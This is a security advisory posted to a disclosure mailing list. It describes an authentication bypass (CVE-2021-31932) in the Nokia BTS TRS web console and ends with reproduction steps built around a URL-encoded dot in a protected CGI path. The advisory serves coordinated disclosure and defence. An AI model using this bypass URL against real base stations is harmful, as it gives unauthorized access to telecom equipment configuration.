Subject: [FD] Nokia BTS Authentication Bypass

  title: Nokia Transport Module Authentication Bypass
                case id: CM-2020-02
                product: BTS TRS web console (FTM_W20_FP2_2019.08.16_0010)
     vulnerability type: Authentication Bypass
               severity: Critical
                  found: 2020-09-28
   CVE: CVE-2021-31932
                     by: Cristiano Maruti (@cmaruti)

[EXECUTIVE SUMMARY]

 The TRS web console allows an authenticated user to remotely manage the BTS
 and its configuration. The analysis discovered an authentication bypass
 vulnerability (CWE-289) in the web management console. A malicious
 unauthenticated user can get access to all the functionalities exposed via
 the web panel circumventing the authentication process. The vulnerability
 lies in the way the web server in use (lighttpd) protects restricted
 resources and how special characters are encoded and pass to the underline
 CGIs. A successful attack can read data from the BTS and read, modify or
 delete BTS configuration.

[VULNERABLE VERSIONS]

 The following version of the TRS web console was affected by the
 vulnerability; previous versions may be vulnerable as well:
 - BTS TRS web console (FTM_W20_FP2_2019.08.16_0010)

[TECHNICAL DETAILS]

It is possible to reproduce the vulnerability following these steps:
1. Open a web browser and insert the BTS TRS web console IP
2. Navigate to a protected resource (for example

3. Subsitute the dot character with the corresponding URL encoded value
(%2e)
4. Resulting URL
(/protected/ShowErrorLog%2ecgi?token=thisIsNotTheRightToken)
   give access without prompt for any authentication credential
